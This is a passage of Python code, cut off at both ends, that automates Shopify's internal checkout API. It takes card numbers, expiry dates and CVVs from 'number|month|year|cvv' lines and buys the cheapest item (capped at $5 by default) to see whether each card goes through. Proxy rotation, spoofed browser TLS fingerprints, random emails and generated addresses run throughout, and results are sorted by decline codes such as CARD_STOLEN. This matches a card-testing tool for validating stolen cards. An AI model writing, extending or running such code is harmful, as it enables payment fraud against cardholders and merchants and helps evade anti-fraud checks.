            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token),
    )
    return resp.status_code, resp.text


# ──────────────────────── Step 5: Proposal 2 (email) ────────────────
def send_proposal2(client: "TLSClient", shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token),
    )
    return resp.status_code, resp.text


# ──────────────────────── Step 6: Proposal 3 (address) ──────────────
def send_proposal3(client: "TLSClient", shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, addr: Address, currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}",
          "address2": "{addr.address2}",
          "city": "{addr.city}",
          "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}",
          "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}",
          "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token),
    )
    return resp.status_code, resp.text


# ──────────────────────── Step 11: Poll ─────────────────────────────
def send_poll_for_receipt(client: "TLSClient", shop_url: str, checkout_url: str, checkout_token: str,
                          session_token: str, build_id: str, source_token: str,
                          poll_id: str, receipt_id: str, receipt_session_token: str) -> Tuple[int, str]:

    params = {
        "operationName": "PollForReceipt",
        "variables":     json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
        "id":            poll_id,
    }
    full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"
    headers = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    headers["x-checkout-web-source-id"] = checkout_token
    resp = client.get(full_url, headers=headers)
    return resp.status_code, resp.text


# ──────────────────────── Step 10: Submit ───────────────────────────
def send_submit_for_completion(client: "TLSClient", shop_url: str, checkout_url: str, checkout_token: str,
                               session_token: str, stable_id: str, variant_id: str, price: str,
                               submit_id: str, build_id: str, source_token: str, queue_token: str,
                               email: str, addr: Address, delivery_handle: str, shipping_amount: str,
                               total_amount: str, pci_session_id: str, attempt_token: str,
                               currency: str, country: str, signed_handles: List[str],
                               is_digital: bool = False,
                               tax_amount: str = None) -> Tuple[int, str]:

    handle_lines = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
    signed_handles_json = "[" + ",".join(handle_lines) + "]"
    page_id = generate_page_id()

    if is_digital:
        total_amount_block = '"totalAmount": {"any": true}'
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["NONE"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
    else:
        total_amount_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "destination": {{
            "streetAddress": {{
              "address1": "{addr.address1}",
              "address2": "{addr.address2}",
              "city": "{addr.city}",
              "countryCode": "{addr.country_code}",
              "postalCode": "{addr.postal_code}",
              "firstName": "{addr.first_name}",
              "lastName": "{addr.last_name}",
              "zoneCode": "{addr.zone_code}",
              "phone": "{addr.phone}",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyByHandle": {{
              "handle": "{delivery_handle}",
              "customDeliveryRate": false
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": false
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''

    tax_val   = tax_amount or "0.0"
    tax_block = f'"proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "USD"}}}}'

    gql_payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": "{session_token}"}},
      "queueToken": "{queue_token}",
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      {delivery_block},
      "merchandise": {{
        "merchandiseLines": [{{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
            }}
          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null, "lineComponents": []
        }}]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        {total_amount_block},
        "paymentLines": [{{
          "paymentMethod": {{
            "directPaymentMethod": {{
              "sessionId": "{pci_session_id}",
              "billingAddress": {{
                "streetAddress": {{
                  "address1": "{addr.address1}",
                  "address2": "{addr.address2}",
                  "city": "{addr.city}",
                  "countryCode": "{addr.country_code}",
                  "postalCode": "{addr.postal_code}",
                  "firstName": "{addr.first_name}",
                  "lastName": "{addr.last_name}",
                  "zoneCode": "{addr.zone_code}",
                  "phone": "{addr.phone}"
                }}
              }},
              "cardSource": null
            }},
            "giftCardPaymentMethod": null,
            "redeemablePaymentMethod": null,
            "walletPaymentMethod": null,
            "walletsPlatformPaymentMethod": null,
            "localPaymentMethod": null,
            "paymentOnDeliveryMethod": null,
            "paymentOnDeliveryMethod2": null,
            "manualPaymentMethod": null,
            "customPaymentMethod": null,
            "offsitePaymentMethod": null,
            "customOnsitePaymentMethod": null,
            "deferredPaymentMethod": null,
            "customerCreditCardPaymentMethod": null,
            "paypalBillingAgreementPaymentMethod": null,
            "remotePaymentInstrument": null
          }},
          "amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}
        }}],
        "billingAddress": {{
          "streetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": "{email}",
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      "poNumber": null,
      "taxes": {{
        "proposedAllocations": null,
        {tax_block},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{
        "signature": null, "signatureUuid": null,
        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
      }},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{
      "requestUrl": "{checkout_url}",
      "pageId": "{page_id}"
    }}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token),
    )
    return resp.status_code, resp.text


# ──────────────────────── Error checks ──────────────────────────────
def check_proposal_errors(step: str, status: int, body: str):
    if status != 200:
        logger.warning("%s: unexpected HTTP %d", step, status)
    matches = re.findall(
        r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"',
        body,
    )
    if not matches:
        return
    for code, msg in matches:
        logger.warning("%s proposal error — code=%s msg=%s", step, code, msg)
    _hard = {"CARD_DECLINED","CARD_EXPIRED","CARD_INVALID","CVV_INVALID",
             "CARD_STOLEN","DO_NOT_HONOR","RISK_REJECTED"}
    for code, _ in matches:
        if code.upper() in _hard:
            raise Exception(f"proposal hard error: {code}")


def check_submit_errors(status: int, body: str):
    if status != 200:
        logger.warning("check_submit_errors: HTTP %d", status)
    m = re.search(r'"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"', body)
    if m and m.group(1) != "SubmitSuccess":
        for i, (code, msg) in enumerate(re.findall(
            r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"',
            body)):
            logger.warning("submit error #%d: code=%s msg=%s", i + 1, code, msg)


# ──────────────────────── Card / proxy parsing ──────────────────────
def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
    parts = card_entry.strip().split('|')
    if len(parts) != 4:
        raise Exception(f"invalid card format: {_redact(card_entry)}")
    try:
        return parts[0], int(parts[1]), int(parts[2]), parts[3]
    except ValueError as e:
        raise Exception(f"invalid card month/year: {e}")


def normalize_proxy(raw: str) -> str:
    p = raw.strip()
    if not p:
        raise Exception("empty proxy")

    scheme = "http://"
    body = p

    if "://" in body:
        scheme, body = body.split("://", 1)
        scheme = scheme + "://"

    parts = body.split(":")
    if len(parts) == 4:
        host, port, user, password = parts
        try:
            port_int = int(port)
            if not (0 < port_int < 65536):
                raise ValueError
        except ValueError:
            raise Exception(f"invalid port in proxy: {port!r}")
        p = f"{scheme}{user}:{password}@{host}:{port}"
    else:
        p = scheme + body

    parsed = urllib.parse.urlparse(p)
    if not parsed.netloc:
        raise Exception(f"invalid proxy format: {raw}")
    return p


# ──────────────────────── Orchestrator ──────────────────────────────
def run_checkout_for_card(shop_url: str, card_entry: str,
                          proxy_url: str = "", low: bool = True) -> CheckResult:
    deadline = time.monotonic() + CHECKOUT_DEADLINE

    currency  = "USD"
    country   = "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")

    result = CheckResult(
        card=card_entry,
        shop_url=shop_url,
        site_name=site_name,
        currency=currency,
        status=CheckStatus.ERROR,
    )

    def _bail(status: CheckStatus, code: str, msg: str, retryable: bool) -> CheckResult:
        result.status      = status
        result.status_code = code
        result.error       = Exception(msg)
        result.retryable   = retryable
        return result

    def _deadline_expired() -> bool:
        return time.monotonic() >= deadline

    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result

    email = generate_random_email()
    impersonate = random.choice(BROWSER_PROFILES)
    client = _get_tls_client(proxy_url, impersonate)

    try:
        # Step 0 — product
        if _deadline_expired():
            return _bail(CheckStatus.ERROR, "DEADLINE", "deadline before step 0", True)
        try:
            _max_p = 5.00 if low else float("inf")
            logger.info(_redact(f"Step 0: {shop_url} (max=${_max_p:.2f})"))
            title, product_id, variant_id, price = find_cheapest_product(client, shop_url, max_price=_max_p)
            logger.info(_redact(f"Step 0 OK: {title!r} variant={variant_id} price={price}"))
        except Exception as e:
            return _bail(CheckStatus.ERROR, "STEP0", f"Step 0 failed: {e}", True)

        # Step 1 — cart + checkout
        if _deadline_expired():
            return _bail(CheckStatus.ERROR, "DEADLINE", "deadline before step 1", True)
        try:
            checkout_url, checkout_token, session_token, checkout_html = \
                add_to_cart_and_checkout(client, shop_url, variant_id)
            stable_id    = extract_stable_id(checkout_html)
            build_id     = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                raise Exception("missing stableId, buildId, or sourceToken")
        except Exception as e:
            return _bail(CheckStatus.ERROR, "STEP1", f"Step 1 failed: {e}", True)

        # Step 2 — private access token
        if _deadline_expired():
            return _bail(CheckStatus.ERROR, "DEADLINE", "deadline before step 2", True)
        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if not pat_id:
                raise Exception("could not extract private_access_token id")
            fetch_private_access_token(client, shop_url, checkout_url, pat_id)
        except Exception as e:
            return _bail(CheckStatus.ERROR, "STEP2", f"Step 2 failed: {e}", True)

        # Step 3 — actions JS (with fallbacks)
        if _deadline_expired():
            return _bail(CheckStatus.ERROR, "DEADLINE", "deadline before step 3", True)
        try:
            actions_url = extract_actions_js_url(checkout_html, shop_url)
            js_body = ""

            if actions_url:
                try:
                    js_body = fetch_actions_js(client, actions_url, shop_url)
                except Exception as e:
                    logger.warning(_redact(f"primary actions fetch failed: {e}"))
                    js_body = ""

            # fallback 1 — preloads.js
            if not js_body:
                logger.info("trying preloads.js fallback for actions URL")
                preloads = fetch_preloads_js(client, shop_url, checkout_html)
                if preloads:
                    actions_url2 = extract_actions_js_url_from_preloads(preloads, shop_url)
                    if actions_url2:
                        try:
                            js_body = fetch_actions_js(client, actions_url2, shop_url)
                            logger.info(f"got actions JS via preloads: {actions_url2}")
                        except Exception as e:
                            logger.warning(_redact(f"preloads actions fetch failed: {e}"))
                    else:
                        # last resort: use preloads body itself — it sometimes
                        # embeds the persisted operation IDs directly
                        logger.info("no actions URL in preloads; scanning preloads body directly")
                        js_body = preloads

            if not js_body:
                raise Exception("could not find actions JS URL (tried HTML, preloads.js, and preloads body)")

            proposal_id = extract_proposal_id(js_body)
            submit_id   = extract_submit_for_completion_id(js_body)
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal or Submit ID")
            _extracted_poll_id = extract_poll_for_receipt_id(js_body)
            poll_for_receipt_id = _extracted_poll_id or \
                "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
        except Exception as e:
            return _bail(CheckStatus.ERROR, "STEP3", f"Step 3 failed: {e}", True)

        # Step 4 — proposal 1
        if _deadline_expired():
            return _bail(CheckStatus.ERROR, "DEADLINE", "deadline before step 4", True)
        try:
            p4_status, proposal_body = send_proposal(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                currency, country,
            )
            check_proposal_errors("step4", p4_status, proposal_body)

            cur = extract_seller_currency(proposal_body)
            if cur and cur != currency:
                currency = cur
            ctr = extract_seller_country(proposal_body)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency

            if currency == "USD":
                sp = extract_seller_merchandise_price(proposal_body)
                if sp and sp != price:
                    price = sp

            queue_token = extract_queue_token(proposal_body)
            if not queue_token:
                raise Exception("could not extract queueToken")
        except Exception as e:
            return _bail(CheckStatus.ERROR, "STEP4", f"Step 4 failed: {e}", True)

        # Step 5 — proposal 2 (email)
        if _deadline_expired():
            return _bail(CheckStatus.ERROR, "DEADLINE", "deadline before step 5", True)
        try:
            p5_status, proposal2_body = send_proposal2(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token, email, currency, country,
            )
            check_proposal_errors("step5", p5_status, proposal2_body)
            queue_token2 = extract_queue_token(proposal2_body)
            if not queue_token2:
                raise Exception("could not extract queueToken")
        except Exception as e:
            return _bail(CheckStatus.ERROR, "STEP5", f"Step 5 failed: {e}", True)

        # Step 6 — proposal 3 (address + fallback)
        if _deadline_expired():
            return _bail(CheckStatus.ERROR, "DEADLINE", "deadline before step 6", True)
        try:
            addr = address_for_country(country)
            fallback_addrs = get_fallback_addresses(addr.country_code)
            fallback_idx = 0
            qt2 = queue_token2
            final_p3_body = None
            final_qt3 = None
            step6_is_digital = False

            for _ in range(1 + len(fallback_addrs)):
                if _deadline_expired():
                    raise Exception("deadline exceeded during address fallback")
                _, proposal3_body = send_proposal3(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_token,
                    qt2, email, addr, currency, country,
                )
                _qt3 = extract_queue_token(proposal3_body)
                if not _qt3:
                    raise Exception("could not extract queueToken")
                _is_dig = not extract_is_shipping_required(proposal3_body)
                if _is_dig or not detect_shipping_restriction(proposal3_body):
                    final_p3_body    = proposal3_body
                    final_qt3        = _qt3
                    step6_is_digital = _is_dig
                    break
                if fallback_idx < len(fallback_addrs):
                    addr = fallback_addrs[fallback_idx]
                    fallback_idx += 1
                    qt2 = _qt3

            if not final_p3_body:
                raise Exception("no shipping available for any country")
            queue_token3 = final_qt3
        except Exception as e:
            return _bail(CheckStatus.ERROR, "STEP6", f"Step 6 failed: {e}", True)

        # Step 7 — proposal 4
        if _deadline_expired():
            return _bail(CheckStatus.ERROR, "DEADLINE", "deadline before step 7", True)
        try:
            _, proposal4_body = send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token3, email, addr, currency, country,
            )
            queue_token4 = extract_queue_token(proposal4_body)
            if not queue_token4:
                raise Exception("could not extract queueToken")
        except Exception as e:
            return _bail(CheckStatus.ERROR, "STEP7", f"Step 7 failed: {e}", True)

        # Step 8 — proposal 5
        if _deadline_expired():
            return _bail(CheckStatus.ERROR, "DEADLINE", "deadline before step 8", True)
        try:
            proposal5_status, proposal5_body = send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token4, email, addr, currency, country,
            )
        except Exception as e:
            return _bail(CheckStatus.ERROR, "STEP8", f"Step 8 failed: {e}", True)

        # PendingTerms poll
        try:
            _poll_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
            _pending_re = re.compile(r'"__typename"\s*:\s*"PendingTerms"')
            for _ in range(6):
                if _deadline_expired():
                    break
                if not _pending_re.search(proposal5_body):
                    break
                _m = _poll_re.search(proposal5_body)
                _wait = int(_m.group(1)) / 1000.0 if _m else 0.5
                time.sleep(max(_wait, 0.3))
                proposal5_status, proposal5_body = send_proposal3(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_token,
                    queue_token4, email, addr, currency, country,
                )
        except Exception:
            pass

        # Step 9 — PCI
        if _deadline_expired():
            return _bail(CheckStatus.ERROR, "DEADLINE", "deadline before step 9", True)
        try:
            ident_sig    = extract_identification_signature(checkout_html)
            vault_url    = extract_vault_url(checkout_html)
            vault_domain = extract_vault_domain(checkout_html) or site_name
            if not ident_sig:
                raise Exception("could not extract identification signature")
            card_name_str = f"{addr.first_name} {addr.last_name}"

            _, pci_body = send_pci_session(
                ident_sig, card_number, card_name_str,
                card_month, card_year, card_cvv,
                vault_domain, proxy_url,
                vault_url=vault_url, vault_domain=vault_domain,
                impersonate=impersonate,
            )
            pci_session_id = extract_pci_session_id(pci_body)

            if not pci_session_id:
                _fb = ("https://checkout.pci.shopifycs.com/sessions"
                       if "shopifyinc" in (vault_url or "")
                       else "https://checkout.pci.shopifyinc.com/sessions")
                _, pci_body = send_pci_session(
                    ident_sig, card_number, card_name_str,
                    card_month, card_year, card_cvv,
                    site_name, proxy_url, vault_url=_fb,
                    impersonate=impersonate,
                )
                pci_session_id = extract_pci_session_id(pci_body)

            if not pci_session_id and proxy_url:
                _, pci_body = send_pci_session(
                    ident_sig, card_number, card_name_str,
                    card_month, card_year, card_cvv,
                    vault_domain, "",
                    vault_url=vault_url, vault_domain=vault_domain,
                    impersonate=impersonate,
                )
                pci_session_id = extract_pci_session_id(pci_body)

            if not pci_session_id:
                raise Exception(f"could not extract session ID (body: {pci_body[:120]})")
        except Exception as e:
            return _bail(CheckStatus.ERROR, "STEP9", f"Step 9 failed: {e}", True)

        # Step 10 — submit
        if _deadline_expired():
            return _bail(CheckStatus.ERROR, "DEADLINE", "deadline before step 10", True)
        try:
            queue_token5 = extract_queue_token(proposal5_body)
            if not queue_token5:
                raise Exception("could not extract queueToken")

            is_digital = step6_is_digital

            delivery_handle = extract_delivery_handle(proposal5_body)
            if not delivery_handle and not is_digital:
                result.retryable = True
                raise Exception("could not extract delivery handle")

            signed_handles = extract_signed_handles(proposal5_body)
            _filled5 = ('"__typename": "FilledDeliveryTerms"' in proposal5_body or
                        '"__typename":"FilledDeliveryTerms"' in proposal5_body)
            if len(signed_handles) == 0 and not is_digital and not _filled5:
                result.retryable = True
                raise Exception("could not extract signedHandles")

            shipping_amount = extract_shipping_amount(proposal5_body)
            if not shipping_amount and not is_digital:
                result.retryable = True
                raise Exception("could not extract shipping amount")
            if not shipping_amount:
                shipping_amount = "0.00"

            total_amount = extract_checkout_total(proposal5_body)
            if not total_amount:
                total_amount = extract_seller_total(proposal5_body)
            if not total_amount and is_digital:
                total_amount = extract_running_total(proposal5_body)
            if not total_amount:
                raise Exception("could not extract total amount")
            result.amount = total_amount

            attempt_token = generate_attempt_token(checkout_token)
            current_tax   = extract_tax_amount(proposal5_body)
            current_total = total_amount

            submit_status, submit_body = 0, ""
            for _ in range(3):
                if _deadline_expired():
                    raise Exception("deadline exceeded during submit")
                submit_status, submit_body = send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token,
                    queue_token5, email, addr, delivery_handle, shipping_amount,
                    current_total, pci_session_id, attempt_token, currency, country,
                    signed_handles, is_digital=is_digital, tax_amount=current_tax,
                )
                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" not in submit_body:
                    break
                new_tax   = extract_tax_from_rejected(submit_body)
                new_total = extract_total_from_rejected(submit_body)
                if new_tax:   current_tax   = new_tax
